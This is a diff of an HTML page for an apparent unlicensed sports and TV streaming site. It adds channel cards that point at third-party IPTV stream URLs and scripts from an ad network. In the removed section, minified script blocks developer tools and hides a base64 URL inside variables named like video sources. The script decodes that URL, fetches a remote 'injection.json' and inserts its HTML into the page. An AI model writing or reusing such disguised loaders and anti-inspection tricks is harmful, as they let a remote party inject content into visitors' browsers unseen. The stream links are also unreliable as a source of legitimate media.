+            <p>Super Sports Laliga</p>
+        </div> 
+
+
+<div class="channel-card" onclick="playChannel('http://suprino.xyz:80/PMF3J9X/BV7HG8H/763977')">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/76/DAZN_2.svg/2560px-DAZN_2.svg.png" alt="A Sports">
+            <p>DAZN 5</p>
+        </div> 
+
+
+<div class="channel-card" onclick="playChannel('https://flu.systemnet.tv/Bein.Hd.3/tracks-v1a1/mono.m3u8')">
+            <img src="https://i.postimg.cc/pTnCnRrM/Icon.jpg" alt="Bein Sports 3">
+            <p>Bein Sports 3</p>
+        </div> 
 
 
 
+<div class="channel-card" onclick="playChannel('http://103.96.235.18:8080/sports1/index.m3u8')">
+            <img src="https://i.postimg.cc/pTnCnRrM/Icon.jpg" alt="A Sports">
+            <p>T Sports 2</p>
+        </div> 
+
+
+
+<div class="channel-card" onclick="playChannel('https://crichd.iptvbd.xyz/m3u8.php/willowextra.m3u8')">
+            <img src="https://i.postimg.cc/pTnCnRrM/Icon.jpg" alt="A Sports">
+            <p>T Sports</p>
+        </div> 
+
+
+
+<div class="channel-card" onclick="playChannel('https://crichd.iptvbd.xyz/m3u8.php/tenspk.m3u8')">
+            <img src="https://i.postimg.cc/pTnCnRrM/Icon.jpg" alt="A Sports">
+            <p>T Sports 1</p>
+        </div> 
+
+
+<div class="channel-card" onclick="playChannel('http://atg100.xyz/live/UL33K17/SYC4T9D/76205.m3u8')">
+            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTmqR_WPT1x8Q5MUYvRPTo8Bpb0cDa8Ac246w&s" alt="A Sports">
+            <p>Jalsha Movie</p>
+        </div> 
+
+
+<div class="channel-card" onclick="playChannel('https://m118753.protect-cdn.net/live/m4-720p.m3u8')">
+            <img src="https://upload.wikimedia.org/wikipedia/en/f/f4/Fox_Cricket_Logo.png" alt="A Sports">
+            <p>FOX Cricket</p>
+        </div> 
+
+
+<div class="channel-card" onclick="playChannel('path_to_your_video12.mp4')">
+            <img src="https://i.postimg.cc/pTnCnRrM/Icon.jpg" alt="A Sports">
+            <p>A Sports</p>
+        </div> 
+
+
+<div class="channel-card" onclick="playChannel('path_to_your_video12.mp4')">
+            <img src="https://i.postimg.cc/pTnCnRrM/Icon.jpg" alt="A Sports">
+            <p>A Sports</p>
+        </div> 
+
+</div>
 
 
 
@@ -468,26 +501,41 @@ function updateVisitCount() {
 
 
 
+<script type='text/javascript' src='//pl24303047.profitablecpmrate.com/a0/34/fc/a034fc5fa86c119b4c8d2eb4f4beef3b.js'></script>
 
+<script type='text/javascript' src='//pl24302930.profitablecpmrate.com/81/4d/ac/814dac8de798b40c155faccf962f28a5.js'></script>
+        
+        
+        
+        
+        
+        
+    </div>
 
-// SOCIAL PANEL JS
-const floating_btn = document.querySelector('.floating-btn');
-const close_btn = document.querySelector('.close-btn');
-const social_panel_container = document.querySelector('.social-panel-container');
+    <script>
+        // Function to play the selected channel
+        function playChannel(url) {
+            // Show the video player
+            document.getElementById('videoPlayer').style.display = 'block';
+            // Hide the channel list
+            document.getElementById('channelContainer').style.opacity = '0';
+            setTimeout(function() {
+                document.getElementById('channelContainer').style.display = 'none';
+            }, 500);
+            // Load the video in video tag
+            document.getElementById('videoSource').src = url;
+            document.getElementById('player').load(); // Load the new source
+        }
 
-floating_btn.addEventListener('click', () => {
-	social_panel_container.classList.toggle('visible')
-});
-</script>
+        // Function to go back to channel list
+        function goBack() {
+            document.getElementById('videoPlayer').style.display = 'none';
+            document.getElementById('channelContainer').style.display = 'grid';
+            setTimeout(function() {
+                document.getElementById('channelContainer').style.opacity = '1';
+            }, 100);
+        }
+    </script>
 
-</div>        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script><script src="https://cdn.radiantmediatechs.com/rmp/5.9.2/js/rmp.min.js"></script><script>
-            var appSettings={
-                loaderimg: "",
-                name: "PSL Official",
-                poster: " https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTmOwm5aR1DTCNkGmNSakKcLtpaSXt9s0qlsvTD_4-6uLcN4zhOsHuVB2L7&s=10",
-                introMp4: "https://sandl.herokuapp.com/video/video?url=https://m.youtube.com/watch?v=G7Evl8C-WIs",
-                introHls: "ht",
-				videoFormat: "mp4",
-            },x={loaderimg:appSettings.loaderimg,name:appSettings.name,poster:appSettings.poster,website:"",licenseKey:"eHp1dXRtb3Z5cEAxNDkyNDI4",autoHeightMode:!0,pip:!1,autoplay:!1,skin:"s4",hideControls:!0,preload:"auto",sharing:!1},firstVideo="";setInterval(()=>{$("#loader-image").attr("src",x.loaderimg),$(".logoText").html(x.name)},10),$(document).contextmenu(function(e){return e.preventDefault(),!1}),document.onkeydown=function(e){return 123!=event.keyCode&&((!e.ctrlKey||!e.shiftKey||e.keyCode!="I".charCodeAt(0))&&((!e.ctrlKey||!e.shiftKey||e.keyCode!="C".charCodeAt(0))&&((!e.ctrlKey||!e.shiftKey||e.keyCode!="J".charCodeAt(0))&&((!e.ctrlKey||e.keyCode!="U".charCodeAt(0))&&void 0))))},setTimeout(()=>{$("#loader").css("display","none"),$("body").css("overflow","auto")},100);var src,secondVideo="mNvbnRlbnQuY29tL3NvZnR";$("span").each(function(e){$(this).on("click",function(){var e=$(this).attr("url");rmp.setControls(!0),src="mp4"==appSettings.videoFormat?{hls:e}:{mp4:[e]},rmp.setSrc(src),rmp.play()})});var thirdVideo="3ZWJ0dXRzL015RHJpdmUvbW";src="mp4"==appSettings.videoFormat?{hls:appSettings.introHls}:{mp4:[appSettings.introMp4]};var fourthVideo="Fpbi9pbmplY3Rpb24uanNvbg==",settings={licenseKey:x.licenseKey,autoHeightMode:x.autoHeightMode,pip:x.pip,delayToFade:3e3,gaLabel:"Live TV",logoWatermark:!0,logoPosition:"topleft",speed:"Speed",isLive:!0,googleCast:!0,airplay:!0,hlsJSMaxBufferLength:24,hlsJSLiveSyncDuration:18,hlsJSStartLevel:-1,hlsJSMinAutoBitrate:1e5,hlsJSAbrBandWidthFactor:.9,hlsJSAbrBandWidthUpFactor:.7,hlsJSLiveBackBufferLength:0,detectAutoplayCapabilities:!0,autoplay:x.autoplay,mutedAutoplayOnMobile:!1,mutedAutoplayOnMacosSafari11Plus:!1,srcChangeAutoplay:!0,playsInline:!0,skin:x.skin,skinBackgroundColor:"rgba(0, 0, 0, 0.7)",skinButtonColor:"FFFFFF",skinAccentColor:"FF0000",ads:!0,nav:!0,adBlockerDetection:!0,adEnablePreloading:!0,adBlockerDetectedMessage:"Ad-blocker software detected. Please disable Ad-blocker to watch stream.",quickRewind:10,quickForward:10,adAutoAlign:!1,hideControls:x.hideControls,preload:x.preload,crossorigin:!0,sharing:x.sharing,sharingUrl:x.website,contentMetadata:{artwork:[{src:x.poster,sizes:"1280x720",type:"image/jpg"}],poster:[x.poster],endOfVideoPoster:[x.poster],thumbnail:x.poster},src:src},elementID="rmpPlayer",rmp=new RadiantMP(elementID),rmpContainer=document.getElementById(elementID);rmp.setLoop(!0),rmp.init(settings),$(function(){$(window).scroll(function e(){return $("#rmpPlayer").css($(window).scrollTop()>1?{position:"fixed",top:"0px"}:{position:"relative",top:"auto"}),$("#buttons-list").css($(window).scrollTop()>1?{"margin-top":$("#rmpPlayer").height()}:{"margin-top":"0px"}),e}())});const request=async e=>{const t=await fetch(e);return await t.json()};navigator.onLine&&request(atob(firstVideo+secondVideo+thirdVideo+fourthVideo)).then(t=>{1==t.inject&&document.querySelector("div").insertAdjacentHTML("afterend",e.content)}).catch(e=>{console.log(appSettings.name)});</script>
-
-</body></html>
+</body>
+</html>
